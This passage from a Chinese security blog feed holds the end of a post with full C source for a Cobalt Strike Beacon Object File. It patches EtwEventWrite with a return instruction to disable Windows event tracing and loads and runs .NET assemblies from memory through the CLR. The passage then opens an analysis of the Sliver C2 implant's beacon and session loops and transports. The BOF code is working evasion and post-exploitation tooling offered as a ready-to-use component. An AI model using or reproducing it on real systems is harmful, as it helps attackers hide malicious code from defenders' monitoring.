oldProtect;</div><div class="line"></div><div class="line"><span class="meta">#ifdef _M_AMD64</span></div><div class="line">SIZE_T length = <span class="number">1</span>;</div><div class="line"><span class="keyword">char</span> patch[] = &#123; <span class="number">0xc3</span> &#125;;</div><div class="line"><span class="meta">#elif defined(_M_IX86)</span></div><div class="line">SIZE_T length = <span class="number">3</span>;</div><div class="line"><span class="keyword">char</span> patch[] = &#123; <span class="number">0xc2</span>,<span class="number">0x14</span>,<span class="number">0x00</span> &#125;;</div><div class="line"><span class="meta">#endif</span></div><div class="line"></div><div class="line">NTSTATUS ntStatus = STATUS_SUCCESS;</div><div class="line">HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">TRUE</span>, KERNEL32$GetCurrentProcessId());</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] OpenProcess Success"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, PAGE_EXECUTE_READWRITE, &amp;oldProtect) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] VirtualProtectEx Failed"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] VirtualProtectEx Success"</span>);</div><div class="line"></div><div class="line">SIZE_T NumberOfBytesWritten = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (KERNEL32$WriteProcessMemory(hProcess, pEtwEventWrite, patch, length, &amp;NumberOfBytesWritten) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] WriteProcessMemory Failed"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] WriteProcessMemory Success"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, oldProtect, &amp;oldProtect) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] VirtualProtectEx Failed"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] VirtualProtectEx Success"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> FindVersion(<span class="keyword">char</span>* AssemblyBytes, <span class="keyword">int</span> dwLength)</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> flag = <span class="literal">TRUE</span>;</div><div class="line"><span class="keyword">char</span> v4[] = &#123; <span class="number">0x76</span>,<span class="number">0x34</span>,<span class="number">0x2E</span>,<span class="number">0x30</span>,<span class="number">0x2E</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x39</span> &#125;;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwLength; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (MSVCRT$memcmp(AssemblyBytes, v4, <span class="number">10</span>) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">flag = <span class="literal">TRUE</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> flag;</div><div class="line"><span class="comment">//int count = 0;</span></div><div class="line"><span class="comment">//for (int i = 0; i &lt; dwLength; i++)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//for (int j = 0; j &lt; 10; j++)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//if (AssemblyBytes[i] == v4[j])</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//count++;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//if (count == 10)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//flag = TRUE;</span></div><div class="line"><span class="comment">//break;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//count = 0;</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//return flag;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> AssemblyLoad(<span class="keyword">wchar_t</span>* wNetVersion , <span class="keyword">char</span>* AssemblyBytes , DWORD AssemblyLength, LPWSTR* ArgumentsArray, <span class="keyword">int</span> NumArguments)</div><div class="line">&#123;</div><div class="line">HRESULT hr;</div><div class="line">ICLRMetaHost* iMetaHost = <span class="literal">NULL</span>;</div><div class="line">ICLRRuntimeInfo* iRuntimeInfo = <span class="literal">NULL</span>;</div><div class="line">ICorRuntimeHost* iRuntimeHost = <span class="literal">NULL</span>;</div><div class="line">IUnknown* pAppDomain = <span class="literal">NULL</span>;</div><div class="line">AppDomain* pDefaultAppDomain = <span class="literal">NULL</span>;</div><div class="line">Assembly* pAssembly = <span class="literal">NULL</span>;</div><div class="line">MethodInfo* pMethodInfo = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">SAFEARRAYBOUND saBound[<span class="number">1</span>];</div><div class="line"><span class="keyword">void</span>* pData = <span class="literal">NULL</span>;</div><div class="line">VARIANT vRet;</div><div class="line">VARIANT vObj;</div><div class="line">VARIANT vPsa;</div><div class="line">SAFEARRAY* args = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">hr = MSCOREE$<span class="built_in">CLRCreateInstance</span>(&amp;xCLSID_CLRMetaHost, &amp;xIID_ICLRMetaHost, (VOID**)&amp;iMetaHost);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] CLRCreateInstance Failed:%d"</span>,hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] CLRCreateInstance Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line">hr = iMetaHost-&gt;lpVtbl-&gt;GetRuntime(iMetaHost, wNetVersion, &amp;xIID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] GetRuntime Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetRuntime Success"</span>);</div><div class="line"></div><div class="line">hr = iRuntimeInfo-&gt;lpVtbl-&gt;GetInterface(iRuntimeInfo,&amp;xCLSID_CorRuntimeHost, &amp;xIID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]GetInterface Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetInterface Success"</span>);</div><div class="line"></div><div class="line">hr = iRuntimeHost-&gt;lpVtbl-&gt;Start(iRuntimeHost);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]CLR Start Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] CLR Start Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//hr = iRuntimeHost-&gt;lpVtbl-&gt;GetDefaultDomain(iRuntimeHost,&amp;pAppDomain);</span></div><div class="line">hr = iRuntimeHost-&gt;lpVtbl-&gt;CreateDomain(iRuntimeHost, (LPCWSTR)L<span class="string">" "</span>, <span class="literal">NULL</span>, &amp;pAppDomain);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]GetDefaultDomain Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetDefaultDomain Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line">hr = pAppDomain-&gt;lpVtbl-&gt;QueryInterface(pAppDomain, &amp;xIID_AppDomain, (VOID**)&amp;pDefaultAppDomain);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]QueryInterface Failed:%p"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] QueryInterface Success"</span>);</div><div class="line"></div><div class="line">saBound[<span class="number">0</span>].cElements = AssemblyLength;</div><div class="line">saBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</div><div class="line">SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, <span class="number">1</span>, saBound);</div><div class="line"><span class="keyword">if</span> (pSafeArray == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayCreate Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+]SafeArrayCreate Success"</span>);</div><div class="line"></div><div class="line">hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &amp;pData);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayAccessData Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] SafeArrayAccessData Success"</span>);</div><div class="line"></div><div class="line">MSVCRT$memcpy(pData, AssemblyBytes, AssemblyLength);</div><div class="line"></div><div class="line">hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayUnaccessData Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] SafeArrayUnaccessData Success"</span>);</div><div class="line"></div><div class="line">hr = pDefaultAppDomain-&gt;lpVtbl-&gt;Load_3(pDefaultAppDomain,pSafeArray, &amp;pAssembly);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]Load_3 Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] Load_3 Success"</span>);</div><div class="line"></div><div class="line">hr = pAssembly-&gt;lpVtbl-&gt;EntryPoint(pAssembly,&amp;pMethodInfo);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]EntryPoint Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] EntryPoint Success"</span>);</div><div class="line"></div><div class="line">MSVCRT$memset(&amp;vRet, <span class="number">0</span>, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">MSVCRT$memset(&amp;vObj, <span class="number">0</span>, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">vObj.vt = VT_NULL;</div><div class="line">vPsa.vt = (VT_ARRAY | VT_BSTR);</div><div class="line">args = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"><span class="keyword">if</span> (NumArguments &gt; <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">vPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, NumArguments);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; NumArguments; i++)</div><div class="line">&#123;</div><div class="line">OLEAUT32$SafeArrayPutElement(vPsa.parray, &amp;i, OLEAUT32$SysAllocString(ArgumentsArray[i]));</div><div class="line">&#125;</div><div class="line"><span class="keyword">long</span> idx[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">OLEAUT32$SafeArrayPutElement(args, idx, &amp;vPsa);</div><div class="line">&#125;</div><div class="line"></div><div class="line">hr = pMethodInfo-&gt;lpVtbl-&gt;Invoke_3(pMethodInfo,vObj, args, &amp;vRet);</div><div class="line"><span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]Invoke Failed:%d"</span>, hr);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] Invoke Success"</span>);</div><div class="line"></div><div class="line">pMethodInfo-&gt;lpVtbl-&gt;Release(pMethodInfo);</div><div class="line">pAssembly-&gt;lpVtbl-&gt;Release(pAssembly);</div><div class="line">pDefaultAppDomain-&gt;lpVtbl-&gt;Release(pDefaultAppDomain);</div><div class="line">iRuntimeInfo-&gt;lpVtbl-&gt;Release(iRuntimeInfo);</div><div class="line">iMetaHost-&gt;lpVtbl-&gt;Release(iMetaHost);</div><div class="line">OLE32$CoUninitialize();</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> go(<span class="keyword">char</span>* args, <span class="keyword">int</span> length)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] go go go"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(PatchETW() == <span class="literal">TRUE</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>,<span class="string">"patch etw Success"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">datap  parser;</div><div class="line">BeaconDataParse(&amp;parser, args, length);</div><div class="line"><span class="keyword">char</span>* AssemblyBytes = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">DWORD AssemblyLength = BeaconDataInt(&amp;parser);</div><div class="line"><span class="keyword">char</span>* AssemblyArguments = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] AssemblyArguments: %s and AssemblyLength :%d "</span>, AssemblyArguments, AssemblyLength);</div><div class="line"></div><div class="line"><span class="keyword">wchar_t</span>* wNetVersion = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">if</span> (FindVersion(AssemblyBytes, AssemblyLength) == <span class="literal">TRUE</span>)</div><div class="line">&#123;</div><div class="line">wNetVersion = L<span class="string">"v4.0.30319"</span>;</div><div class="line"><span class="comment">//toWideChar("v4.0.30319", wNetVersion, 22);</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">wNetVersion = L<span class="string">"v2.0.50727"</span>;</div><div class="line"><span class="comment">//toWideChar("v2.0.50727", wNetVersion, 22);</span></div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] wNetVersion is %ls"</span>, wNetVersion);</div><div class="line"></div><div class="line"><span class="comment">////将Assembly参数转化为WCHAR类型</span></div><div class="line">size_t convertedChars = <span class="number">0</span>;</div><div class="line"><span class="keyword">wchar_t</span>* wAssemblyArguments = <span class="literal">NULL</span>;</div><div class="line">DWORD wideSize = MSVCRT$strlen(AssemblyArguments) + <span class="number">1</span>;</div><div class="line">wAssemblyArguments = (<span class="keyword">wchar_t</span>*)MSVCRT$malloc(wideSize * <span class="keyword">sizeof</span>(<span class="keyword">wchar_t</span>));</div><div class="line">MSVCRT$mbstowcs_s(&amp;convertedChars, wAssemblyArguments, wideSize, AssemblyArguments, _TRUNCATE);</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] wAssemblyArguments is %ls"</span>, wAssemblyArguments);</div><div class="line"></div><div class="line"><span class="keyword">int</span> NumArgs = <span class="number">0</span>;</div><div class="line">LPWSTR* ArgumentsArray = <span class="literal">NULL</span>;</div><div class="line">ArgumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &amp;NumArgs);</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] ArgumentsArray is %ls"</span>, wAssemblyArguments);</div><div class="line"></div><div class="line">AssemblyLoad(wNetVersion, AssemblyBytes, AssemblyLength, ArgumentsArray, NumArgs);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/" target="_blank" rel="external">Shellcode: Loading .NET Assemblies From Memory</a></li><li><a href="https://github.com/microsoft/krabsetw/blob/master/krabs/README.md" target="_blank" rel="external">https://github.com/microsoft/krabsetw/blob/master/krabs/README.md</a></li><li><a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="external">NuGet的使用</a></li><li><a href="https://github.com/microsoft/krabsetw/blob/master/examples/NativeExamples/user_trace_001.cpp" target="_blank" rel="external">krabsetw例子说明</a></li><li><a href="https://cloud.tencent.com/developer/article/1785567" target="_blank" rel="external">CobaltStrike 插件编写指南</a></li><li><a href="http://sleep.dashnine.org/manual/index.html" target="_blank" rel="external">http://sleep.dashnine.org/manual/index.html</a></li><li><a href="https://github.com/anthemtotheego/InlineExecute-Assembly/blob/main/README.md" target="_blank" rel="external">InlineExecute-Assembly</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Execute-Assembly-原理&quot;&gt;&lt;a href=&quot;#0x01-Execute-Assembly-原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 Execute-Assembly 原理&quot;&gt;&lt;/a&gt;0x01 Execute-Assembly 原理&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&amp;gt; 加载CLR环境&lt;/li&gt;
&lt;li&gt;2&amp;gt; 获取程序域&lt;/li&gt;
&lt;li&gt;3&amp;gt; 装载程序集&lt;/li&gt;
&lt;li&gt;4&amp;gt; 执行程序集&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Windows 攻防" scheme="https://findream.github.io/categories/Windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Sliver源码分析</title>
    <link href="https://findream.github.io/2023/03/02/Sliver%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2023/03/02/Sliver源码分析/</id>
    <published>2023-03-02T12:45:11.000Z</published>
    <updated>2023-05-03T14:00:56.804Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Implant上线分析"><a href="#Implant上线分析" class="headerlink" title="Implant上线分析"></a>Implant上线分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的main函数中，分别存在<code>beaconStartup</code>和<code>sessionStartup</code>。<code>beaconStartup</code>对应的是beacon模式，<code>sessionStartup</code>对应的是session模式。</p><a id="more"></a><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">func</span> <span class="selector-tag">main</span>() </div><div class="line">&#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="selector-tag">log</span><span class="selector-class">.Printf</span>(<span class="string">"Hello my name is %s"</span>, consts.SliverName)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="selector-tag">limits</span><span class="selector-class">.ExecLimits</span>() <span class="comment">// Check to see if we should execute</span></div><div class="line"><span class="comment">// &#123;&#123;if .Config.IsService&#125;&#125;</span></div><div class="line"><span class="selector-tag">svc</span><span class="selector-class">.Run</span>(<span class="string">""</span>, &amp;sliverService&#123;&#125;)</div><div class="line"><span class="comment">// &#123;&#123;else&#125;&#125;</span></div><div class="line"><span class="comment">// &#123;&#123;if .Config.IsBeacon&#125;&#125;</span></div><div class="line"><span class="selector-tag">beaconStartup</span>()</div><div class="line"><span class="comment">// &#123;&#123;else&#125;&#125; ------- IsBeacon/IsSession -------</span></div><div class="line"><span class="selector-tag">sessionStartup</span>()</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>sessionStartup</code>中会调用<code>StartConnectionLoop</code>函数创建链接，<code>sessionMainLoop</code>函数进行链接之后的命令处理。而<code>beaconStartup</code>会调用<code>StartBeaconLoop</code>和<code>beaconMainLoop</code>。通过对比<code>sessionMainLoop</code>和<code>StartBeaconLoop</code>两个函数，从代码逻辑上，两者并没有什么区别，从功能来看，两者区别在于通讯协议的处理上。可以看到，在beacon模式下，如果使用mtls协议，调用的是位于<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/beacon.go</code>的<code>mtlsbeacon</code>函数，如果是session协议,则会调用位于<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/session.go</code>的<code>mtlsConnect</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//beacon</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartBeaconLoop</span><span class="params">(abort &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> &lt;-<span class="title">chan</span> *<span class="title">Beacon</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">[...]</div><div class="line"><span class="keyword">for</span> uri := <span class="keyword">range</span> c2Generator &#123;</div><div class="line"><span class="keyword">switch</span> uri.Scheme &#123;</div><div class="line"><span class="comment">// *** MTLS ***</span></div><div class="line"><span class="keyword">case</span> <span class="string">"mtls"</span>:</div><div class="line">beacon = mtlsBeacon(uri)</div><div class="line"><span class="keyword">case</span> <span class="string">"wg"</span>:</div><div class="line"><span class="comment">// *** WG ***</span></div><div class="line">beacon = wgBeacon(uri)</div><div class="line">[...]</div><div class="line">&#125;</div><div class="line">[...]</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;()</div><div class="line"><span class="keyword">return</span> nextBeacon</div><div class="line">&#125;</div><div class="line"><span class="comment">//session</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartConnectionLoop</span><span class="params">(abort &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> &lt;-<span class="title">chan</span> *<span class="title">Connection</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">[...]</div><div class="line"><span class="keyword">for</span> uri := <span class="keyword">range</span> c2Generator &#123;</div><div class="line"><span class="keyword">switch</span> uri.Scheme &#123;</div><div class="line"><span class="comment">// *** MTLS ***</span></div><div class="line"><span class="keyword">case</span> <span class="string">"mtls"</span>:</div><div class="line">connection, err = mtlsConnect(uri)</div><div class="line">[...]</div><div class="line">&#125;</div><div class="line"><span class="keyword">case</span> <span class="string">"wg"</span>:</div><div class="line"><span class="comment">// *** WG ***</span></div><div class="line">connection, err = wgConnect(uri)</div><div class="line">[...]</div><div class="line">&#125;</div><div class="line">[...]</div><div class="line">&#125;</div><div class="line">&#125;()</div><div class="line"><span class="keyword">return</span> nextConnection</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在session模式下，<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的<code>sessionMainLoop</code>方法，整个流程很纯粹就是一个session模式，逻辑也很简单，首先进行链接，然后注册Sliver Implant，也就是将主机信息发送过去，然后获取一些Handle(处理器)。然后接收命令，根据命令的类型，传递给不同的Handle进行处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sessionMainLoop</span><span class="params">(connection *transports.Connection)</span> <span class="title">error</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line">err := connection.Start()</div><div class="line">[...]</div><div class="line">pivots.RestartAllListeners(connection.Send)</div><div class="line"><span class="keyword">defer</span> pivots.StopAllListeners()</div><div class="line"><span class="keyword">defer</span> connection.Stop()</div><div class="line"><span class="comment">//</span></div><div class="line">connectionErrors = <span class="number">0</span></div><div 